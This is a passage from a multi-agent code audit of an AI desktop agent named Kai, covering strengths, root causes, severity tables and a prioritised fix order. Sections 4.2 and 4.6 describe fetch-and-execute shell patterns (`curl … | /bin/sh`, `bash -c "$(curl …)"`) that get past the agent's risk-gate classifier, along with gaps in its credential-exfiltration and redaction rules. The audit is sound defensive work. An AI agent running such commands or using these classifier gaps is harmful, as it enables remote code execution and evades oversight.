- **Real crate boundaries with a real test culture.** ~650 authored tests, a mutation-checked guarantee table (`docs/VERIFICATION.md`), e2e tests against a hanging model for cancellation, escalate-on-doubt executor tests, and a `guard-removal.py` that demonstrates every safety guard fails a test when removed. CI *enforcement* is weak (§3.9) but the suite itself is far above average.
- **Fail-closed safety architecture.** Gates answer "no" on doubt with a bounded rejection cap; OS probes and freshness checks are target-scoped; human-check detection runs before every model call on all three action paths; privacy redaction covers prompt, trace, UI events and memory. The *architecture* is right even where the stated pattern tables leak (§4.2 theme 1).
- **Honest documentation.** Bench results files carry "Not measured on this run" sections; `DECISIONS.md` is an append-only decision log; the prior audit was verified fixed finding-by-finding (§3.8). Even the review agents repeatedly noted the repo admits its own failures (e.g. the lost 26B raw runs).
- **Dependency hygiene.** 939 crates, all crates.io; single versions of every heavy runtime; platform deps correctly `cfg`-gated; licenses consistent (MIT). One unused dependency (`keyring` in `kai-cli`) and some feature-set over-breadth (`tokio "full"`) are the only nits.

### 4.2 Systemic problems (root causes behind clusters of findings)

1. **Pattern-table safety is the weak boundary.** The risk gate, scrubber and untrusted-content scanner are architecturally sound but implemented as literal word/regex lists that miss variants: `curl … | /bin/sh` and `bash -c "$(curl …)"` (CORE-SAFE-01, CRITICAL), credential-access/exfil patterns (CORE-SAFE-03), space-separated card numbers in the scrubber (CORE-SAFE-02), lowercase keys/IBANs in `untrusted::sensitive` (CORE-SAFE-08), dialog risk words past 80 chars (OS-WEB-05), purchase words in Autopilot (CORE-SAFE-04). Fix approach: move from word lists to a small classified grammar plus regression fixtures per bypass; add the guard-removal style tests.
2. **Failure feedback to the model is sometimes silence.** `"action failed"` constants (CORE-ENG-05), `AskedUser` on invalid/stale tool calls (CORE-ENG-02), swallowed prefix failures (CORE-ENG-04), unlearnable gate refusals outside bench (CORE-SAFE-16). This directly limits how well the agent can use the tool surface we designed.
3. **Lifecycle and ownership edges of processes and windows.** No single-instance guard so two Kai copies fight over one mouse/hotkey/settings file (APP-SH-02); starting a local model server kills another instance's server and stale handles can corrupt state (OS-WEB-04/06/07/28); quitting abandons runs without tripping the kill switch (APP-SH-07); closing the mini window strands the only approval surface (APP-SH-03); a cancelled browser step poisons the lane for the rest of the session (OS-WEB-02, HIGH).
4. **Integrity of measurements and records.** `kai bench` always exits 0 (CLI-01) and macOS/Windows replay can never fail the workflow (TEST-02), so green CI proves less than it appears; same-day runs overwrite earlier results JSON (CLI-02 — measured data already lost once); `--record` misattributes the model for local/auto runs (CLI-03); benchmark numbers depend on unrecorded settings (CLI-07); CI itself is paused (TEST-03, deliberate); headline README numbers lack shipped raw evidence (TBD-03, TBD-06). Fix order: exit codes → unique result stems → record fidelity → re-run claims → re-arm CI.
5. **UI honesty and destructive-scope.** Fabricated constants read as live measurements (APP-UX-04); "View trace" opens the wrong run (APP-UX-01); "Delete all history" leaves runs_dir training data and derived lessons (APP-UX-02, CORE-SAFE-11); mock bench page is the page's primary action (APP-UX-08); `open_app`/`open_url` report success without evidence (OS-PER-16); Autopilot never asks for purchase words while README says it does (CORE-SAFE-04).
6. **Blocking work on threads that must stay responsive.** Sync settings writes on the UI thread that can silently zero settings (APP-SH-01, CORE-CLI-03); mouse/keyboard backend built synchronously on the UI thread (APP-SH-04); per-frame disk reads in status bar and History/Skills render (APP-SH-06, APP-UX-06); 5 s SIGTERM waits and sync spawns inside async web/local code (OS-WEB-10/14); blocking DNS/subprocess on async executor threads in CLI (CLI-15); per-step canonicalize in the engine (CORE-ENG-08).
7. **Docs drift after rapid pivots (macOS release, computer tools).** Stale counts (models 17→16, skills 9→10, tasks 10→30: DOC-02, CLI-09, TBD-05), `thinkingLevel` conflict with DECISIONS (CORE-CLI-04), DESIGN.md mixing superseded v1 and current v2 (DOC-04), DECISIONS preamble contradicting the macOS reversal (DOC-05), a stale NEXT_SESSION_PROMPT (DOC-01), HARNESS.md test count 110 vs ~641 (DOC-03).

### 4.3 Severity totals per area

| Area | Files read | CRITICAL | HIGH | MEDIUM | LOW | INFO | Findings |
|------|-----------:|---------:|-----:|-------:|----:|-----:|---------:|
| CORE-ENG | 31 | 0 | 1 | 4 | 4 | 3 | 12 |
| CORE-CLI | 36 | 0 | 1 | 2 | 6 | 2 | 11 |
| CORE-SAFE | 34 | **1** | 3 | 7 | 4 | 2 | 17 |
| OS-PER | 34 | **1** | 5 | 11 | 10 | 3 | 30 |
| OS-WEB | 23 | **1** | 3 | 13 | 10 | 4 | 31 |
| CLI | 26 | 0 | 3 | 7 | 9 | 0 | 19 |
| APP-SH | 29 | 0 | 3 | 9 | 7 | 0 | 19 |
| APP-UX | 25+ | 0 | 2 | 8 | 6 | 0 | 16 |
| TEST | 77 | 0 | 2 | 7 | 3 | 3 | 15 |
| DOC | 48 | 0 | 0 | 1 | 6 | 3 | 10 |
| TBD | 59 (+100 JSONs machine-checked) | 0 | 1 | 3 | 4 | 0 | 8 |
| **Total** | **~420 + cross-checks** | **3** | **24** | **72** | **69** | **20** | **188** |

### 4.4 Cross-area duplicate clusters (fix once, close all references)

| Root cause | Referenced by |
|------------|---------------|
| Settings write not atomic / silent reset to defaults | CORE-CLI-03, APP-SH-01 |
| `--no-memory` still writes/learns from traces | CORE-SAFE-05, CLI-06 |
| Stale inventory counts in README/docs | CORE-CLI-09, DOC-02, TBD-05 |
| "Delete all history" does not delete everything | APP-UX-02, CORE-SAFE-11 (lessons/runs_dir) |
| Single-instance / process-ownership family | APP-SH-02, OS-WEB-04, OS-WEB-06, OS-WEB-07, OS-WEB-25, OS-WEB-28 |
| Blocking I/O on UI/async threads | CORE-ENG-08, APP-SH-01, APP-SH-04, APP-SH-06, APP-UX-06, OS-WEB-10, OS-WEB-14, CLI-15 |
| Bench cannot fail / replay can't gate | CLI-01, TEST-02 |
| Model-file integrity (hash/size enforcement) | CORE-CLI-02, OS-WEB-17 |
| Quit/kill-switch fail-safes | APP-SH-07, OS-PER-23 |
| Duplicated `fnv1a` / percentile / stop-answer plumbing / engine construction | CORE-SAFE-15, CLI-17, APP-SH-08, CLI INFO (four engine constructions) |

### 4.5 Consolidated "not needed / remove" list (highlights; full detail in each area's section)

- **Dead code:** `frame::crop` (OS-PER-24), `live::clear` (OS-PER-24), `local::download::sha256_file` and `local::cancel_token` (OS-WEB removal list), `RuntimeSpec::variant` (tests-only), `cua/mapping.rs` unreachable back/forward arms (CORE-CLI-05,10), CLI `applied` plumbing + dead report branch (CLI-12), CLI `ab.rs` stale header, `unused keyring` dep in `kai-cli/Cargo.toml`, duplicate percentile in `kai-cli/src/main.rs` (CLI-17), `unreachable!()` in `cua_protocol.rs` removable via an enum.
- **UI:** `running.rs` TokenCounter/UsageBar fabricated bars (APP-UX-04), `STARTERS` demote-or-delete (APP-UX-03), "Run benchmark (mock)" button if benchmarks aren't planned (APP-UX-08), Ely `I18n` install + `kai.ready` catalog entry (APP-SH-05), mini-window duplicated stop/answer (APP-SH-08), vendor-path test include `ui.rs:371-374` (APP-SH-19).
- **Docs/files:** `docs/NEXT_SESSION_PROMPT.md` delete/archive (DOC-01), `.claude/settings.json` jevos allowlist (DOC-06), `docs/img/blender-table.png` orphan (DOC-07), design.md v1 prose → dated appendix (DOC-04), `deploy/.../fixtures/README.txt` placeholder (TBD-08).
- **Explicitly keep:** everything in the test tree (§3.9), `bench/runs/` git-ignored generated data, sub-result folders excluded from `kai bench report` (deliberate, documented), the vendored Ely copy (with its recorded patch, DOC-08 — document it in vendor/README.md before touching).

### 4.6 Recommended fix order

**P0 — security/safety (all three CRITICALs plus their siblings):**
1. `CORE-SAFE-01` shell classifier RCE bypass (`curl|sh`, `bash -c "$(curl …)"`). Add the credential-access/exfil rules (`CORE-SAFE-03`) in the same change.
2. `OS-PER-01` `open_app` Linux arbitrary shell command without approval.
3. `OS-WEB-01` Enter/Esc auto-answers destructive page dialogs — route through the risk gate.
4. `OS-WEB-03` page-triggered downloads land outside the risk gate; `OS-WEB-18` world-readable browser profile.
5. `CORE-SAFE-02` scrubber misses spaced card/account numbers (also `CORE-SAFE-08` lowercase keys/IBANs).
6. `OS-PER-03/04` clipboard destroy/race; `CORE-SAFE-04` Autopilot purchase asks.
   Each fix ships with a regression test that fails without the fix (follow `bench/results/2026-10-12-verification/guard-removal.py`).

**P1 — data integrity, trust and lifecycle:**
1. `CORE-ENG-01` team `Success` on empty results (CLI exit code trusts it).
2. `CLI-01` bench exit code → then `CLI-02` unique result stems → then `CLI-03` record fidelity.
3. `CORE-CLI-01` 429 retry/failover; `CORE-CLI-02`+`OS-WEB-17` enforce sha256/size on installs.
4. `APP-UX-01/02`, `APP-SH-01/02/03/07`, `CORE-ENG-03` (privacy latch vs docs), `OS-WEB-02/04/06/07`.
5. `TEST-01/02/04/05` gates, then `TEST-03` re-arm CI triggers; `TBD-01/02` make the deploy actually work.

**P2 — UX honesty, feedback quality, docs:**
- The §3.8 fillers inventory rows; `CORE-ENG-02/04/05/06` failure-feedback repairs; `APP-UX-04/05/06/08`, `APP-SH-05/06/08`; the DOC refresh pass (DOC-01..05, CLI-09, TBD-05); `TBD-04` training-data parity.

**P3 — polish:** remaining LOW/INFO findings, dead-code removals from §4.5, dependency cleanup.

### 4.7 Verification contract for the fixing agent

1. `cargo test --workspace` must stay green; every fix adds the test named in its finding.
2. Security fixes (P0) must add bypass-regression tests and keep `guard-removal.py`-style proof: a test that fails when the guard is removed.
3. Where a fix changes behavior the docs describe, update the doc in the same change (several findings are explicit doc/code conflicts: CORE-CLI-04, CORE-SAFE-02, CORE-ENG-03, DOC-05).
4. Do not regress the "What's good" sections; when in doubt consult `DECISIONS.md` before changing a deliberate decision (each area lists its conflicts).
5. After `CLI-01`/`TEST-02`/`TEST-05` are fixed, re-run the bench and capture workflows on macOS/Windows/Linux and only then restore the CI triggers (TEST-03).

## 5. Appendix: fragment provenance

The eleven fragments listed below were produced by eleven independent review agents, each
restricted to a non-overlapping file scope and required to read every file in full and attest
coverage per file in its "Scope covered" section. For this document the fragments were merged
verbatim (headings demoted one level, severity labels normalized) into §3. Intermediate
fragments were held in a scratch directory during assembly.

| Fragment | Area | Files read in full | C / H / M / L / I | Lines |
|----------|------|-------------------:|-------------------|------:|
| `01-core-engine.md` | CORE-ENG | 31 | 0 / 1 / 4 / 4 / 3 | 202 |
| `02-core-client-models.md` | CORE-CLI | 36 | 0 / 1 / 2 / 6 / 2 | 261 |
| `03-core-safety-memory.md` | CORE-SAFE | 34 | 1 / 3 / 7 / 4 / 2 | 281 |
| `04-os-perception.md` | OS-PER | 34 | 1 / 5 / 11 / 10 / 3 | 977 |
| `05-os-web-local.md` | OS-WEB | 23 | 1 / 3 / 13 / 10 / 4 | 925 |
| `06-cli.md` | CLI | 26 | 0 / 3 / 7 / 9 / 0 | 279 |
| `07-app-shell.md` | APP-SH | 29 | 0 / 3 / 9 / 7 / 0 | 276 |
| `08-app-pages-ux.md` | APP-UX | 25 | 0 / 2 / 8 / 6 / 0 | 361 |
| `09-tests-ci.md` | TEST | 77 | 0 / 2 / 7 / 3 / 3 | 293 |
| `10-docs-meta.md` | DOC | 48 | 0 / 0 / 1 / 6 / 3 | 273 |
| `11-train-bench-deploy-skills.md` | TBD | 59 | 0 / 1 / 3 / 4 / 0 | 134 |
| **Total** | 11 areas | ~420 (+100 bench JSONs machine-checked) | **3 / 24 / 72 / 69 / 20** | **4262** |

Additionally: per-finding provenance is the finding ID prefix itself (CORE-ENG, CORE-CLI,
CORE-SAFE, OS-PER, OS-WEB, CLI, APP-SH, APP-UX, TEST, DOC, TBD). Severity totals across all
areas: **3 CRITICAL, 24 HIGH, 72 MEDIUM, 69 LOW, 20 INFO — 188 findings.**

**Note on DOC-10:** the finding that the review scaffold at the repo root contained empty
sections is resolved by this final assembly — this file is now the complete review with no
placeholders. Decide whether to keep it in the tree (suggested: move it to `docs/reviews/`
when the fixes land) or delete it after the fix work is merged.

**Fixing order:** start with §4.6 P0 (the three CRITICALs and their siblings), then P1.
Each finding's `Fix` field is written to be actionable without further research; consult
the area's `What's good` section before changing anything it cites as deliberate.
